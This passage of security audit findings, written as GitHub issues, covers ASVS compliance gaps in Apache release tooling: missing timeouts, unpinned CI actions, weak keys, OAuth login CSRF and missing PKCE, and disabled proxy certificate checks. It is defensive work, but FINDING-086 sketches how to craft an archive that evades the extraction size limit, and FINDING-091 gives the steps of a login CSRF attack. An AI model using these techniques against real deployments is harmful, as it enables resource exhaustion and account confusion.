        self.headers['Cache-Control'] = 'no-store'
        self.headers['Pragma'] = 'no-cache'
```

### Acceptance Criteria
- [ ] All admin endpoints return Cache-Control: no-store header
- [ ] TextResponse class sets anti-caching headers by default
- [ ] ElementResponse and other response classes also set anti-caching headers
- [ ] Unit tests verify headers are present
- [ ] Manual testing on shared workstations confirms no credential caching

### References
- Source reports: L2:14.3.2.md
- Related findings: ASVS-1432-CRI-005
- ASVS sections: 14.3.2

### Priority
High

---

## Issue: FINDING-081 - rsync Subprocess Execution Without Timeout

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
SSH rsync operations execute without timeout controls via indefinite proc.wait() blocking. Unlike worker processes which have comprehensive resource limits (300s CPU, 3GB memory), the SSH server runs in the main web server process. Hung rsync operations can exhaust server resources and affect HTTP request handling. Each connection holds asyncio task, subprocess, SSH session, and file descriptors indefinitely.

### Details
In atr/ssh.py line 460 and related functions (_step_02_handle_safely, _step_07a_process_validated_rsync_read, _step_07b_process_validated_rsync_write), rsync operations use proc.wait() without timeout protection.

While other subprocess operations correctly use asyncio.wait_for(proc.communicate(), timeout=300), rsync has no timeout protection. Stalled network connections or malicious clients can cause resource exhaustion by holding connections open indefinitely.

### Recommended Remediation
Add timeout to rsync subprocess execution using asyncio.wait_for():

```python
try:
    exit_code = await asyncio.wait_for(proc.wait(), timeout=3600)  # 1 hour
except asyncio.TimeoutError:
    proc.kill()
    await proc.wait()
    # Log timeout and return error
    return non_zero_exit_code
```

Make timeout configurable via atr/config.py:
```python
SSH_RSYNC_TIMEOUT = 3600  # 1 hour for large transfers
```

Add monitoring/alerting for rsync operations exceeding threshold. Consider implementing progress tracking to distinguish stalled vs. active transfers.

### Acceptance Criteria
- [ ] rsync operations terminate after configured timeout (default 1 hour)
- [ ] Timeout is configurable via SSH_RSYNC_TIMEOUT parameter
- [ ] Timed-out processes are properly killed and cleaned up
- [ ] Error is logged and returned to client on timeout
- [ ] Unit tests verify timeout behavior
- [ ] Monitoring alerts on operations exceeding threshold

### References
- Source reports: L2:15.1.3.md, L2:15.2.2.md
- Related findings: FINDING-018, FINDING-317
- ASVS sections: 15.1.3, 15.2.2

### Priority
High

---

## Issue: FINDING-082 - Pre-commit Ecosystem Dependabot Monitoring Disabled

**Labels:** bug, security, priority:high, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** [L1, L2]

**Description:**

### Summary
Dependabot monitoring for the pre-commit ecosystem is explicitly disabled via commented-out configuration in .github/dependabot.yml. This leaves 16+ security-critical tools (including pip-audit v2.10.0, zizmor v1.23.1, shellcheck v0.11.0.1) without automated update monitoring, creating a gap in the dependency management policy. Security scanning tools used in the development pipeline could become outdated, potentially missing newly detectable vulnerabilities.

### Details
In .github/dependabot.yml lines 24-30, the pre-commit ecosystem configuration is commented out with a TODO about cooldown support. The .pre-commit-config.yaml file contains multiple security tools that should be monitored for updates, but without Dependabot monitoring, updates depend on manual processes rather than automated alerts.

The lack of proactive notifications means the project may run outdated versions of security scanning tools, potentially missing vulnerabilities that newer versions would detect.

### Recommended Remediation
**Option A** — Enable when Dependabot supports cooldowns: Uncomment and configure pre-commit ecosystem monitoring with appropriate cooldown when the feature becomes available.

**Option B** — Implement custom monitoring script:
1. Create scripts/check_precommit_versions.py that:
   - Parses .pre-commit-config.yaml
   - Checks age of each hook version via git ls-remote
   - Enforces 90-day maximum age for security tools
2. Integrate into CI pipeline via .github/workflows/analyze.yml

**Option C** — Document manual process: Add manual update schedule to CONTRIBUTING.md requiring monthly execution of `pre-commit autoupdate`.

### Acceptance Criteria
- [ ] Pre-commit tools are monitored for updates (automated or manual process)
- [ ] Security tools are updated within 90 days of new releases
- [ ] Process is documented in CONTRIBUTING.md
- [ ] CI pipeline enforces or checks update cadence
- [ ] Pre-commit hooks remain at supported versions

### References
- Source reports: L1:15.2.1.md, L2:15.1.2.md
- Related findings: None
- ASVS sections: 15.1.2, 15.2.1

### Priority
High

---

## Issue: FINDING-083 - Missing Centralized Documentation of Resource-Intensive Operations

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
ASVS 15.1.3 explicitly requires documentation that identifies time-consuming or resource-demanding functionality, describes how to prevent availability loss, and explains how to avoid response timeout issues. The application has strong runtime controls but lacks a consolidated inventory of resource-intensive operations with their limits, timeout chains, and availability defenses. This is fundamentally a documentation gap rather than a technical deficiency.

### Details
The application implements comprehensive resource controls including:
- Worker process limits (300s CPU, 3GB memory)
- Archive extraction limits
- SBOM generation timeouts
- SVN operation timeouts
- Rate limiting

However, no centralized document exists at atr/docs/resource-management.md that inventories these operations, their limits, timeout relationships, and capacity planning guidance. Without this documentation, operations cannot plan capacity, developers may introduce issues, and security reviews cannot verify completeness.

### Recommended Remediation
Create atr/docs/resource-management.md documenting:

1. **Resource-intensive operations inventory** with time profiles and limits:
   - Archive extraction (size limits, timeout chains)
   - SBOM generation (timeout, memory limits)
   - Signature verification (timeout)
   - rsync transfers (timeout needs)
   - SVN operations (timeout)
   - Git clone operations (timeout)
   - All other identified operations

2. **Timeout chain architecture** showing HTTP→Task Queue→Worker→Subprocess relationships

3. **Per-user and per-application limits**:
   - Rate limiting configuration
   - Upload size limits
   - Worker resource quotas

4. **Monitoring and alerting guidance** for capacity issues

5. **Capacity planning recommendations** based on typical workloads

Total effort: ~1-2 days.

### Acceptance Criteria
- [ ] atr/docs/resource-management.md created with all sections
- [ ] All 15+ resource-intensive operations documented
- [ ] Timeout chains and relationships documented
- [ ] Limits and controls for each operation documented
- [ ] Monitoring and capacity planning guidance included
- [ ] Document linked from main README.md
- [ ] Document reviewed by operations team

### References
- Source reports: L2:15.1.3.md
- Related findings: FINDING-081, FINDING-084, FINDING-305, FINDING-306, FINDING-307, FINDING-308, FINDING-309
- ASVS sections: 15.1.3

### Priority
High

---

## Issue: FINDING-084 - Unbounded Directory Traversal and File Hashing in Signature Provenance Endpoint

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The signature provenance endpoint (/api/signature/provenance) performs unbounded directory traversal and file I/O operations within a single HTTP request handler. For users associated with many committees, this triggers traversal of potentially thousands of files, reading each matching file and computing SHA3-256 hashes—all synchronously within the HTTP request context. Code comments acknowledge this is resource-intensive but no controls are applied.

### Details
In atr/api/__init__.py, the signature_provenance() function and its helpers (_match_committee_keys(), _match_unfinished()) traverse the filesystem looking for matching signature files, reading each file and computing cryptographic hashes. Rate limiting (10 requests/hour) and JWT authentication provide some protection, but each individual request can still cause significant resource consumption.

For users with access to many committees, this could result in:
- Traversing thousands of directories
- Reading hundreds of files
- Computing hundreds of SHA3-256 hashes
- All within a single HTTP request thread

### Recommended Remediation
**Recommended approach:** Offload to task queue. Convert to async task that returns task ID for polling status, benefiting from worker resource limits:

1. Create background task function
2. Return task ID immediately
3. Client polls for results
4. Task benefits from 300s timeout and memory limits

**Alternative:** Add limits with early termination:
```python
_MAX_FILES_TO_SCAN = 10000
_MAX_COMMITTEES_TO_SCAN = 100
# Implement early termination after first match found
# Add limit checks in traversal loops
```

Task queue approach aligns with application's existing architecture and provides consistent user experience.

### Acceptance Criteria
- [ ] Signature provenance operations offloaded to task queue
- [ ] Immediate response returns task ID
- [ ] Client can poll for task completion
- [ ] Worker resource limits (300s, 3GB) apply to operation
- [ ] Early termination after first match (if applicable)
- [ ] Unit tests verify resource limits are enforced
- [ ] Documentation updated with new endpoint behavior

### References
- Source reports: L2:15.1.3.md
- Related findings: FINDING-083
- ASVS sections: 15.1.3

### Priority
High

---

## Issue: FINDING-085 - GitHub Actions CI Workflows Use Mutable References

**Labels:** bug, security, priority:high, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Several CI workflows use mutable GitHub Actions references that violate ASVS 15.2.1 compliance by preventing version tracking and creating supply chain attack vectors. While some workflows (build.yml, analyze.yml, codeql.yaml) properly use SHA-pinned references, others use mutable branch names (@master) or version tags (@v6, @v7). This creates inconsistent security posture and prevents effective tracking against update/remediation timeframes.

### Details
Affected files:
- .github/workflows/pylint.yml line 20
- .github/workflows/unittest.yml line 20
- .github/workflows/unit-tests.yml lines 20 and 25

These workflows use references like:
- `actions/checkout@master` (mutable branch)
- `actions/setup-python@v7` (mutable tag)

While some workflows correctly use SHA-pinned references like `actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2`, the inconsistency creates supply chain risk.

### Recommended Remediation
Pin all GitHub Actions to full SHA commits with version comments following the pattern used in build.yml:

```yaml
- uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
  with:
    persist-credentials: false
```

Verification Steps:
1. Update all workflow files with SHA-pinned references
2. Verify Dependabot can generate update PRs for pinned actions
3. Add CI check to prevent merging workflows with mutable references
4. Document pinning policy in CONTRIBUTING.md

### Acceptance Criteria
- [ ] All GitHub Actions in workflows are SHA-pinned
- [ ] Each pinned action includes version comment (# vX.Y.Z)
- [ ] persist-credentials: false is set for checkout actions
- [ ] Dependabot successfully generates update PRs for pinned actions
- [ ] CI check prevents merging workflows with mutable references
- [ ] CONTRIBUTING.md documents action pinning policy
- [ ] All workflow files follow consistent pinning pattern

### References
- Source reports: L1:15.2.1.md
- Related findings: None
- ASVS sections: 15.2.1

### Priority
High

---

## Issue: FINDING-086 - Archive Extraction Size Tracking Reset by Metadata Files

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The archive extraction functions return 0 instead of total_extracted when skipping certain members (metadata files, device files, unsafe paths). This resets the running size counter, allowing attackers to bypass the extraction size limit by interleaving skipped members with large files. Attackers can extract 150MB+ archives despite 100MB limits by interleaving metadata files.

### Details
In atr/archives.py:
- Lines 143-159: _tar_archive_extract_member() returns 0 when skipping members
- Lines 227-236: _zip_archive_extract_member() returns 0 when skipping members

The vulnerable return statements:
```python
# When skipping metadata or device files
return 0, extracted_paths  # BUG: Should return total_extracted
```

This allows attackers to craft archives like:
```
file1.txt (50MB)
._metadata (skipped, counter resets to 0)
file2.txt (50MB)
._metadata (skipped, counter resets to 0)
file3.txt (50MB)
Total: 150MB extracted despite 100MB limit
```

### Recommended Remediation
Fix all return paths in both _tar_archive_extract_member() and _zip_archive_extract_member() to return total_extracted instead of 0 when skipping members:

```python
# When skipping metadata files
if member_name.startswith('._'):
    log.info(f"Skipping macOS metadata file: {member_name}")
    return total_extracted, extracted_paths  # FIX: Preserve counter

# When skipping device files
if tar_info.isdev():
    log.info(f"Skipping device file: {member_name}")
    return total_extracted, extracted_paths  # FIX: Preserve counter
```

Add verification tests that create archives with interleaved metadata files and verify the size limit is enforced.

### Acceptance Criteria
- [ ] All early returns preserve total_extracted counter
- [ ] Size limit is enforced regardless of skipped members
- [ ] Unit tests verify counter is not reset by metadata files
- [ ] Integration tests verify 100MB limit with interleaved metadata
- [ ] Tests verify limit enforcement for device files, unsafe paths
- [ ] Existing extraction functionality remains unchanged

### References
- Source reports: L2:15.2.2.md
- Related findings: None
- ASVS sections: 15.2.2

### Priority
High

---

## Issue: FINDING-087 - Git Clone Operations Without Network Timeout

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Git clone operations for source tree comparison lack explicit network timeouts. While worker process limits provide coarse protection (300s wall-clock timeout), hung git operations consume worker threads until the entire worker process is killed. The git_client.fetch() operation has no timeout configured, potentially causing resource exhaustion from stalled network connections or malicious clients.

### Details
In atr/tasks/checks/compare.py lines 170-185, the _clone_repo() function performs git clone operations without timeout:

```python
async def _clone_repo(...):
    # No timeout on this network operation
    await asyncio.to_thread(git_client.fetch, ...)
```

While the worker process has a 300s wall-clock timeout, this is a coarse control that kills the entire worker. Multiple hung git operations could exhaust worker threads before the wall-clock timeout fires.

### Recommended Remediation
Wrap the asyncio.to_thread(_clone_repo, ...) call with asyncio.wait_for() using a 120-second timeout:

```python
try:
    result = await asyncio.wait_for(
        asyncio.to_thread(_clone_repo, ...),
        timeout=120  # 2 minutes for git clone
    )
except asyncio.TimeoutError:
    log.warning(f"Git clone operation timed out after 120s")
    return None  # Indicate failure
```

Add configuration option:
```python
# In atr/config.py
GIT_CLONE_TIMEOUT = 120  # seconds, configurable
```

Handle TimeoutError and return None to indicate failure. Consider adding monitoring/alerting for operations exceeding threshold.

### Acceptance Criteria
- [ ] Git clone operations timeout after configured duration (default 120s)
- [ ] Timeout is configurable via GIT_CLONE_TIMEOUT parameter
- [ ] TimeoutError is caught and handled gracefully
- [ ] Function returns None on timeout to indicate failure
- [ ] Unit tests verify timeout behavior
- [ ] Monitoring logs operations exceeding threshold
- [ ] Worker threads are not exhausted by hung operations

### References
- Source reports: L2:15.2.2.md
- Related findings: FINDING-305
- ASVS sections: 15.2.2

### Priority
High

---

## Issue: FINDING-088 - Distribution Operations Have No Audit Logging

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The entire distributions.py writer module has no calls to append_to_audit_log(). Distribution operations include recording package uploads to platforms like Maven/PyPI/npm, automating GitHub Actions workflows, and deleting distribution records—all security-critical supply chain operations. An attacker with committee access could record fake distributions, trigger malicious distribution workflows, or delete distribution records with zero audit trail.

### Details
The atr/storage/writers/distributions.py file contains functions for:
- automate() - triggers GitHub Actions workflows
- record() - records package distributions
- record_from_data() - records distribution metadata
- delete_distribution() - removes distribution records

None of these functions call self.__write_as.append_to_audit_log(), creating a complete absence of audit logging for distribution management operations.

This is particularly critical for supply chain security, as distribution records represent the official record of where package artifacts were published.

### Recommended Remediation
Add audit logging to all distribution operations:

```python
async def automate(self, ...):
    # Existing logic
    await self.__write_as.db.commit()
    
    # NEW: Add audit log entry
    await self.__write_as.append_to_audit_log(
        action="distribution_automate",
        details={
            "asf_uid": asf_uid,
            "release_key": release_key,
            "platform": platform,
        }
    )

async def record(self, ...):
    # Existing logic
    await self.__write_as.db.commit()
    
    # NEW: Add audit log entry
    await self.__write_as.append_to_audit_log(
        action="distribution_record",
        details={
            "asf_uid": asf_uid,
            "release_key": release_key,
            "platform": platform,
            "package": package,
            "version": version,
        }
    )

# Similar additions for record_from_data() and delete_distribution()
```

### Acceptance Criteria
- [ ] automate() logs workflow trigger with context
- [ ] record() logs distribution recording with all metadata
- [ ] record_from_data() logs external distribution imports
- [ ] delete_distribution() logs deletion with context
- [ ] Audit log includes asf_uid, release_key, platform, package, version
- [ ] Unit tests verify audit log entries are created
- [ ] Audit log queries can retrieve distribution history
- [ ] Documentation updated with audit log schema

### References
- Source reports: L2:16.1.1.md
- Related findings: FINDING-025
- ASVS sections: 16.1.1

### Priority
High

---

## Issue: FINDING-089 - SSH Host Key Generated with RSA 2048-bit (~112 bits of security)

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The SSH server host key is generated using asyncssh.generate_private_key('ssh-rsa') without specifying a key size, which defaults to 2048 bits. According to NIST SP 800-57 Part 1 Rev. 5, RSA 2048-bit provides approximately 112 bits of security, falling short of the ASVS 11.2.3 requirement for a minimum of 128 bits of security (which requires RSA ≥3072 bits). Additionally, if a host key already exists at the specified path, it is loaded without verifying its algorithm or key size.

### Details
In atr/ssh.py lines 148-189, the _init_host_keys() function generates SSH host keys:

```python
key = asyncssh.generate_private_key('ssh-rsa')  # Defaults to 2048 bits
```

RSA 2048-bit provides ~112 bits of security, below the ASVS 11.2.3 requirement of 128 bits minimum. When loading existing keys from disk, no validation checks the algorithm or key size, potentially loading weak keys.

### Recommended Remediation
**Option A (Recommended):** Use Ed25519 which provides 128 bits of security:

```python
key = asyncssh.generate_private_key('ssh-ed25519')
```

**Option B:** Use RSA 4096-bit which provides ~140 bits of security:

```python
key = asyncssh.generate_private_key('ssh-rsa', key_size=4096)
```

Add validation logic for existing keys:

```python
def _validate_host_key(key):
    """Validate that host key meets minimum cryptographic strength."""
    if isinstance(key, asyncssh.RSAKey):
        if key.key_size < 3072:
            raise ValueError(f"RSA key size {key.key_size} below minimum 3072")
    elif isinstance(key, asyncssh.Ed25519Key):
        pass  # Ed25519 always meets requirements
    else:
        raise ValueError(f"Unsupported key type: {type(key)}")
    return key
```

### Acceptance Criteria
- [ ] Generated SSH host keys meet 128-bit security minimum
- [ ] Ed25519 keys are preferred (Option A), or RSA 4096-bit used (Option B)
- [ ] Existing keys are validated on load
- [ ] Keys below minimum strength are rejected with clear error
- [ ] Unit tests verify key generation meets requirements
- [ ] Documentation updated with key requirements
- [ ] Migration plan for existing deployments with weak keys

### References
- Source reports: L2:11.2.3.md, L2:11.6.1.md
- Related findings: FINDING-090
- ASVS sections: 11.2.3, 11.6.1

### Priority
High

---

## Issue: FINDING-090 - No Validation of Uploaded OpenPGP Key Cryptographic Strength

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The application accepts and stores OpenPGP public keys without validating their cryptographic strength. Keys are parsed and stored with their algorithm type and key length recorded in the database, but no validation is performed to ensure these parameters meet minimum security requirements. This allows weak keys (e.g., RSA 1024-bit or smaller, deprecated DSA keys) to be imported and subsequently used for release artifact signature verification.

### Details
In atr/storage/writers/keys.py lines 109-350, the keyring_fingerprint_model() function parses OpenPGP keys and extracts algorithm and key size, but performs no validation:

```python
# Algorithm and key size are extracted but not validated
key_algorithm = packet.pubkey_algorithm  # No check if algorithm is approved
key_length = packet.key_size  # No check if size meets minimum
```

In atr/tasks/checks/signature.py lines 64-131, the _check_core_logic() function uses these keys for signature verification without checking cryptographic strength. This allows weak keys like RSA 1024-bit or deprecated DSA to be used for verifying release signatures.

### Recommended Remediation
Add validation in both keyring_fingerprint_model() and _check_core_logic():

```python
# Approved algorithms per ASVS 11.2.3
APPROVED_ALGORITHMS = {
    'RSAEncryptOrSign': 3072,  # RSA minimum bits
    'RSASign': 3072,
    'ECDSA': 256,  # ECDSA minimum bits
    'EdDSA': 255,  # EdDSA minimum bits (Ed25519)
    'ECDH': 256,
}

def _validate_key_strength(algorithm, key_size):
    """Validate OpenPGP key meets minimum cryptographic strength."""
    if algorithm not in APPROVED_ALGORITHMS:
        raise ValueError(f"Unsupported algorithm: {algorithm}")
    
    min_size = APPROVED_ALGORITHMS[algorithm]
    if key_size < min_size:
        raise ValueError(
            f"{algorithm} key size {key_size} below minimum {min_size}"
        )
```

Apply validation:
1. In keyring_fingerprint_model() - reject weak keys at import time
2. In _check_core_logic() - filter keys by strength before verification

### Acceptance Criteria
- [ ] Only approved algorithms are accepted (RSA, ECDSA, EdDSA, ECDH)
- [ ] RSA keys must be ≥3072 bits
- [ ] ECDSA keys must be ≥256 bits
- [ ] EdDSA keys must be ≥255 bits
- [ ] Weak keys are rejected with descriptive error message
- [ ] Signature verification filters keys by cryptographic strength
- [ ] Unit tests verify weak keys are rejected
- [ ] Documentation updated with key requirements

### References
- Source reports: L2:11.2.3.md, L2:11.6.1.md
- Related findings: FINDING-089
- ASVS sections: 11.2.3, 11.6.1

### Priority
High

---

## Issue: FINDING-091 - OAuth State Parameter Not Bound to User Agent Session (Login CSRF)

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The OAuth state parameter is generated with cryptographic randomness (secrets.token_hex(16)) and validated on callback, but it is not bound to the specific user-agent (browser session) that initiated the flow. Any HTTP client possessing a valid state value can complete the callback, regardless of whether it was the same user agent that initiated the authorization request. This enables Login CSRF attacks where an attacker can trick a victim into completing the attacker's OAuth flow, logging the victim in as the attacker.

### Details
In src/asfquart/generics.py lines 47-93, the OAuth implementation:
1. Generates state with secrets.token_hex(16)
2. Stores it in pending_states dictionary
3. Validates state matches on callback

However, there is no binding between the state and the user-agent's session. An attacker can:
1. Initiate OAuth flow and capture state parameter
2. Trick victim into visiting callback URL with attacker's state
3. Victim completes OAuth and is logged in as attacker
4. Victim's actions are attributed to attacker's account

### Recommended Remediation
Bind the OAuth state to the user-agent using a short-lived cookie:

```python
# During login initiation
nonce = secrets.token_hex(16)
state = hashlib.sha256(nonce.encode()).hexdigest()

# Store nonce with state
pending_states[state] = {
    'nonce': nonce,
    'timestamp': time.time(),
}

# Set cookie before redirect
response = quart.redirect(authorization_url)
response.set_cookie(
    'oauth_nonce',
    nonce,
    max_age=workflow_timeout,
    secure=True,
    httponly=True,
    samesite='Lax'
)

# During callback, verify cookie nonce matches stored nonce
cookie_nonce = quart.request.cookies.get('oauth_nonce')
if not cookie_nonce or cookie_nonce != state_data['nonce']:
    return error_response("Invalid session binding")
```

### Acceptance Criteria
- [ ] OAuth state is bound to user-agent via cookie
- [ ] Cookie has SameSite=Lax, httponly, and secure flags
- [ ] Callback validates cookie nonce matches stored nonce
- [ ] Different user-agents cannot complete each other's flows
- [ ] Cookie expires after workflow timeout
- [ ] Unit tests verify session binding
- [ ] Integration tests verify Login CSRF is prevented

### References
- Source reports: L2:10.1.2.md, L2:10.2.1.md
- Related findings: FINDING-092, FINDING-093
- ASVS sections: 10.1.2, 10.2.1

### Priority
High

---

## Issue: FINDING-092 - No PKCE Implementation in OAuth Authorization Code Flow

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The OAuth flow uses the state parameter for CSRF protection but does not implement Proof Key for Code Exchange (PKCE). ASVS 10.1.2 specifically names PKCE code_verifier as a client-generated secret that should be transaction-specific and session-bound. Without PKCE, the authorization code itself is the sole bearer credential for obtaining tokens, vulnerable to code interception attacks via Referer header leak, browser history, open redirector, malicious browser extensions, or network-level interception.

### Details
In src/asfquart/generics.py lines 48-101, the OAuth implementation includes state parameter for CSRF protection but no PKCE implementation. The flow is:

1. Authorization request with state only (no code_challenge)
2. Authorization code returned in callback
3. Code exchanged for token

Without PKCE, an intercepted authorization code can be exchanged for tokens by an attacker. PKCE would require the attacker to also possess the code_verifier, making code interception attacks ineffective.

### Recommended Remediation
Implement PKCE (RFC 7636) if the ASF OAuth service supports it:

```python
# On login initiation
code_verifier = secrets.token_urlsafe(64)
code_challenge = base64.urlsafe_b64encode(
    hashlib.sha256(code_verifier.encode()).digest()
).rstrip(b'=').decode()

# Store code_verifier in pending_states
pending_states[state] = {
    'code_verifier': code_verifier,
    'timestamp': time.time(),
}

# Include in authorization request
authorization_url = (
    f"{OAUTH_URL}?response_type=code"
    f"&client_id={CLIENT_ID}"
    f"&redirect_uri={redirect_uri}"
    f"&state={state}"
    f"&code_challenge={code_challenge}"
    f"&code_challenge_method=S256"
)

# On token exchange
code_verifier = state_data['code_verifier']
token_url = (
    f"{OAUTH_TOKEN_URL}?grant_type=authorization_code"
    f"&code={code}"
    f"&redirect_uri={redirect_uri}"
    f"&client_id={CLIENT_ID}"
    f"&code_verifier={code_verifier}"
)
```

### Acceptance Criteria
- [ ] PKCE code_verifier is generated on login initiation
- [ ] code_challenge is computed using S256 method
- [ ] code_challenge is sent in authorization request
- [ ] code_verifier is stored securely in pending_states
- [ ] code_verifier is sent in token exchange request
- [ ] Authorization code cannot be used without code_verifier
- [ ] Unit tests verify PKCE flow
- [ ] Documentation confirms ASF OAuth service supports PKCE

### References
- Source reports: L2:10.1.2.md, L2:10.2.1.md
- Related findings: FINDING-091, FINDING-093
- ASVS sections: 10.1.2, 10.2.1

### Priority
High

---

## Issue: FINDING-093 - Process-Local OAuth State Storage Breaks Validation in Multi-Instance Deployments

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The pending_states dictionary is process-local (line 31 in src/asfquart/generics.py). In a multi-instance or load-balanced deployment, if the OAuth callback routes to a different instance than the one that initiated the flow, the state lookup fails because pending_states is not shared across processes. While this fail-safe behavior prevents exploitation, it means that in multi-instance deployments the state validation becomes unreliable, potentially leading to operational workarounds that weaken security.

### Details
In src/asfquart/generics.py line 31:

```python
pending_states = {}  # Process-local, not shared across instances
```

The OAuth flow in a load-balanced deployment:
1. User hits Instance A, initiates OAuth, state stored in Instance A's memory
2. User completes OAuth, callback hits Instance B
3. Instance B looks for state in its own pending_states (empty)
4. State validation fails even though flow is legitimate

This creates operational pressure to disable state validation or use sticky sessions, both of which have security implications.

### Recommended Remediation
Use a shared, TTL-backed store for OAuth state to support multi-instance deployments:

```python
import aioredis

# Initialize Redis connection
redis_client = aioredis.from_url(
    os.environ.get('REDIS_URL', 'redis://localhost:6379'),
    decode_responses=True
)

async def store_state(state: str, data: dict, ttl: int):
    """Store OAuth state in Redis with TTL."""
    await redis_client.setex(
        f"oauth_state:{state}",
        ttl,
        json.dumps(data)
    )

async def pop_state(state: str) -> dict | None:
    """Atomically retrieve and delete OAuth state."""
    # Use Lua script for atomic get-and-delete
    lua_script = """
    local value = redis.call('GET', KEYS[1])
    if value then
        redis.call('DEL', KEYS[1])
    end
    return value
    """
    result = await redis_client.eval(lua_script, 1, f"oauth_state:{state}")
    return json.loads(result) if result else None

# Replace pending_states[state] = data with:
await store_state(state, data, workflow_timeout)

# Replace pending_states.pop(state) with:
state_data = await pop_state(state)
```

### Acceptance Criteria
- [ ] OAuth state is stored in shared Redis instance
- [ ] State has automatic TTL expiration
- [ ] State retrieval is atomic (get-and-delete)
- [ ] Multi-instance deployments can validate state correctly
- [ ] Callback can hit any instance and succeed
- [ ] Unit tests verify shared state storage
- [ ] Integration tests verify multi-instance behavior
- [ ] Documentation updated with Redis requirement

### References
- Source reports: L2:10.1.2.md, L2:10.2.1.md
- Related findings: FINDING-091, FINDING-092
- ASVS sections: 10.1.2, 10.2.1

### Priority
High

---

## Issue: FINDING-094 - OAuth Token Exchange Bypasses Application's Hardened TLS Context

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The OAuth authorization code exchange creates an aiohttp.ClientSession with default SSL settings instead of using the application's hardened TLS context (create_secure_session()). While Python 3.10+ defaults include TLS 1.2 minimum, this creates inconsistent security posture for the security-critical OAuth flow that handles session credentials. The documented hardening (TLS 1.2+, CERT_REQUIRED, check_hostname) is not applied to this critical authentication path.

### Details
In src/asfquart/generics.py lines 82-108, the OAuth callback creates a plain ClientSession:

```python
async with aiohttp.ClientSession() as session:
    rv = await session.get(OAUTH_URL_CALLBACK % code)
```

The application has a create_secure_session() function (likely in atr/util.py) that configures:
- TLS 1.2+ enforcement
- ssl.CERT_REQUIRED for certificate verification
- check_hostname=True for hostname verification
- Secure cipher suite selection

The OAuth token exchange bypasses all these hardening measures, using only Python's default SSL context.

### Recommended Remediation
Create an OAuth-specific SSL context matching application security standards:

```python
import ssl
import aiohttp

# Create hardened SSL context
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = True
ssl_context.verify_mode = ssl.CERT_REQUIRED
ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2

# Use with aiohttp
connector = aiohttp.TCPConnector(ssl=ssl_context)
async with aiohttp.ClientSession(connector=connector) as session:
    rv = await session.get(OAUTH_URL_CALLBACK % encoded_code)
```

Or use the existing create_secure_session() utility:

```python
from atr import util

async with util.create_secure_session(
    timeout=aiohttp.ClientTimeout(sock_read=15)
) as session:
    rv = await session.get(OAUTH_URL_CALLBACK % encoded_code)
```

### Acceptance Criteria
- [ ] OAuth token exchange uses hardened TLS context
- [ ] TLS 1.2+ is enforced for OAuth connections
- [ ] Certificate verification is enabled (CERT_REQUIRED)
- [ ] Hostname verification is enabled (check_hostname=True)
- [ ] Secure cipher suites are configured
- [ ] Unit tests verify TLS configuration
- [ ] Integration tests verify OAuth still works with hardening
- [ ] Consistent with other HTTP client usage in application

### References
- Source reports: L2:10.1.2.md, L2:12.3.2.md, L2:12.3.3.md, L2:13.2.3.md
- Related findings: FINDING-095
- ASVS sections: 10.1.2, 12.3.2, 12.3.3, 13.2.3

### Priority
High

---

## Issue: FINDING-095 - Apache Reverse Proxy Disables All TLS Certificate Validation for Backend Connections

**Labels:** bug, security, priority:high, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The Apache reverse proxy explicitly disables all TLS certificate validation mechanisms when connecting to backend containers. While TLS encryption is enforced via SSLProxyEngine On and SSLProxyProtocol -all +TLSv1.2 +TLSv1.3, the configuration completely bypasses certificate verification using SSLProxyVerify none, SSLProxyCheckPeerCN off, SSLProxyCheckPeerName off, and SSLProxyCheckPeerExpire off. In a container escape or port-hijacking scenario, an attacker could intercept all proxied traffic.

### Details
In tooling-vm-ec2-de.apache.org.yaml lines 91-153, the Apache configuration:

```apache
SSLProxyEngine On
SSLProxyProtocol -all +TLSv1.2 +TLSv1.3
SSLProxyVerify none                    # Disables cert verification
SSLProxyCheckPeerCN off                # Disables CN check
SSLProxyCheckPeerName off              # Disables hostname check
SSLProxyCheckPeerExpire off            # Disables expiry check
```

While TLS is enforced, the complete absence of certificate validation means:
- Any certificate is accepted (self-signed, expired, wrong hostname)
- Container escape or port hijacking allows MITM
- No assurance that connection is to legitimate backend

### Recommended Remediation
Configure Apache to trust ONLY the specific self-signed certificate generated for the container:

```apache
SSLProxyEngine On
SSLProxyProtocol -all +TLSv1.2 +TLSv1.3

# Trust the container's specific self-signed certificate
SSLProxyCACertificateFile /var/opt/atr-staging/hypercorn/secrets/cert.pem

# Enable verification against trusted CA
SSLProxyVerify require
SSLProxyCheckPeerCN on
SSLProxyCheckPeerName on
# Note: Expiry checking omitted since self-signed certs may have long validity
```

The SSLProxyCACertificateFile directive tells Apache to use the container's specific self-signed cert as the trusted CA certificate, providing cryptographic binding to the specific backend.

### Acceptance Criteria
- [ ] Apache trusts only the specific container certificate
- [ ] SSLProxyVerify is set to 'require'
- [ ] Hostname verification is enabled
- [ ] Certificate mismatch causes connection failure
- [ ] Container escape scenario cannot intercept traffic
- [ ] Integration tests verify proxy functionality with verification
- [ ] Certificate rotation procedure is documented
